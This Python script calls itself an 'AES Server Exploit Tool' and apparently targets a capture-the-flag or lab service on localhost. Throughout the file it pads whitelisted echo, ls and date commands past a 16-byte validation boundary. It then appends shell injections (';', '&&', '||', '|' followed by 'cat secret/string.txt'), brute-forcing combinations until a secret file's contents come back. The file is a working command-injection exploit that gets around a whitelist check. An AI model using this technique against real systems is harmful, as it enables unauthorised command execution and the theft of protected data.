import socket
import re
import time

def connect_to_server():
    """Connect to the AES encryption server."""
    HOST = "localhost"  # Use localhost for client connections
    PORT = 5000
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    return client

def send_command(client, command):
    """Send a command to the server and return the response."""
    client.sendall(command.encode())
    response = client.recv(4096)
    return response.decode()

def encrypt_command(cmd):
    """Encrypt a command and return the encrypted hex."""
    client = connect_to_server()
    response = send_command(client, f"encrypt {cmd}")
    client.close()
    
    match = re.search(r"Encrypted command: ([a-f0-9]+)", response)
    if match:
        return match.group(1)
    print(f"Failed to encrypt: {response}")
    return None

def run_encrypted(encrypted_hex):
    """Run an encrypted command and return the output."""
    client = connect_to_server()
    response = send_command(client, f"run {encrypted_hex}")
    client.close()
    
    match = re.search(r"Output: (.*)", response, re.DOTALL)
    if match:
        return match.group(1).strip()
    print(f"Failed to run: {response}")
    return None

def exploit_whitelist_truncation():
    """
    Exploit the 16-byte truncation vulnerability while satisfying the whitelist regex.
    
    The key insight:
    1. The whitelist allows 'echo' followed by words and dots
    2. The server only validates the first 16 bytes for execution
    3. We can craft a command that passes regex but contains injection after 16 bytes
    """
    print("\n=== Exploiting Whitelist and 16-Byte Truncation ===")
    
    # Create padding to push our malicious command beyond 16 bytes
    # echo command allows words and dots in its regex
    padding_commands = [
        "echo AAAAAAAAAAAA",      # 17 bytes (echo + space + 12 A's)
        "echo AAAAAAAAAAA",       # 16 bytes (echo + space + 11 A's)
        "echo AAAAAAAAAA",        # 15 bytes (echo + space + 10 A's)
        "echo A.A.A.A.A.A",       # Using dots which are allowed in echo regex
        "echo test.test.test",    # Another variation with dots
    ]
    
    # Commands to append after our padding
    # These will execute after the 16-byte cutoff
    injection_commands = [
        ";cat secret/string.txt",   # Semicolon for command separation
        "&cat secret/string.txt",   # Background execution
        "&&cat secret/string.txt",  # Logical AND
        "||cat secret/string.txt",  # Logical OR
        "|cat secret/string.txt",   # Pipe
    ]
    
    # Try each combination
    for padding in padding_commands:
        for injection in injection_commands:
            cmd = f"{padding}{injection}"
            print(f"\nTrying: {cmd}")
            
            # Check if it passes the regex
            enc = encrypt_command(cmd)
            if enc:
                print(f"Encryption successful: {enc}")
                result = run_encrypted(enc)
                print(f"Result: {result}")
                
                # If result doesn't look like normal echo output, it might be successful
                if result and not result.startswith("AAAAA") and not "test" in result:
                    print(f"Potential file contents: {result}")
                    return result
            time.sleep(0.5)  # Small delay
    
    return None

def exploit_ls_command():
    """Try using the ls command which is also in the whitelist."""
    print("\n=== Exploiting with ls command ===")
    
    # ls command allows paths in its regex
    padding_commands = [
        "ls /tmp/AAAAAAAA",   # Path format with padding
        "ls /AAAAAAAAAAA",    # Another path with padding
        "ls /root/AAAAAA",    # Another path with padding
    ]
    
    # Commands to append after our padding
    injection_commands = [
        ";cat secret/string.txt",
        "&cat secret/string.txt",
        "&&cat secret/string.txt",
        "||cat secret/string.txt",
        "|cat secret/string.txt",
    ]
    
    # Try each combination
    for padding in padding_commands:
        for injection in injection_commands:
            cmd = f"{padding}{injection}"
            print(f"\nTrying: {cmd}")
            
            enc = encrypt_command(cmd)
            if enc:
                print(f"Encryption successful: {enc}")
                result = run_encrypted(enc)
                print(f"Result: {result}")
                
                # If result doesn't look like an ls error, it might be successful
                if result and not "No such file" in result and not "cannot access" in result:
                    print(f"Potential file contents: {result}")
                    return result
            time.sleep(0.5)
    
    return None

def exploit_date_command():
    """Try using the date command which has no regex restrictions."""
    print("\n=== Exploiting with date command ===")
    
    # Date command has no regex restrictions, but we need to ensure
    # the injection starts after 16 bytes
    padding_commands = [
        "date AAAAAAAAAAAA",   # date + space + 12 A's = 17 bytes
        "date AAAAAAAAAAA",    # date + space + 11 A's = 16 bytes  
        "date AAAAAAAAAA",     # date + space + 10 A's = 15 bytes
    ]
    
    # Commands to append after our padding
    injection_commands = [
        ";cat secret/string.txt",
        "&cat secret/string.txt",
        "&&cat secret/string.txt",
        "||cat secret/string.txt",
        "|cat secret/string.txt",
    ]
    
    # Try each combination
    for padding in padding_commands:
        for injection in injection_commands:
            cmd = f"{padding}{injection}"
            print(f"\nTrying: {cmd}")
            
            enc = encrypt_command(cmd)
            if enc:
                print(f"Encryption successful: {enc}")
                result = run_encrypted(enc)
                print(f"Result: {result}")
                
                # If result doesn't look like a date output, it might be successful
                if result and not "invalid date" in result.lower():
                    print(f"Potential file contents: {result}")
                    return result
            time.sleep(0.5)
    
    return None

def analyze_16_byte_boundary():
    """Analyze precisely where the 16-byte boundary falls for different commands."""
    print("\n=== Analyzing 16-Byte Boundary ===")
    
    # Generate commands with increasing lengths to find exact truncation point
    for i in range(10, 20):
        # Test with echo command
        padding = "A" * i
        cmd = f"echo {padding}"
        print(f"Testing '{cmd}' (length: {len(cmd)})")
        
        enc = encrypt_command(cmd)
        if enc:
            result = run_encrypted(enc)
            print(f"Result: {result}")
            
            # If the output shows all our A's, it wasn't truncated
            if result and len(result) == len(padding):
                print(f"Command not truncated at length {len(cmd)}")
            else:
                print(f"Command possibly truncated at length {len(cmd)}")
        
        time.sleep(0.5)
    
    return None

def main():
    print("Improved AES Server Exploit Tool")
    print("===============================")
    
    try:
        # Test server connection
        print("Testing server connection...")
        client = connect_to_server()
        client.close()
        print("Connection successful!\n")
        
        # First, analyze where exactly the 16-byte boundary is
        analyze_16_byte_boundary()
        
        # Try exploiting with echo command first (as it worked in the original output)
        result = exploit_whitelist_truncation()
        if result:
            print("\n=== EXPLOIT SUCCESSFUL ===")
            print(f"Contents of string.txt: {result}")
            return
        
        # Try exploiting with ls command
        result = exploit_ls_command()
        if result:
            print("\n=== EXPLOIT SUCCESSFUL ===")
            print(f"Contents of string.txt: {result}")
            return
        
        # Try exploiting with date command
        result = exploit_date_command()
        if result:
            print("\n=== EXPLOIT SUCCESSFUL ===")
            print(f"Contents of string.txt: {result}")
            return
        
        print("\nCould not successfully read string.txt despite all attempts.")
        
    except ConnectionRefusedError:
        print("Error: Could not connect to the server. Make sure it's running.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()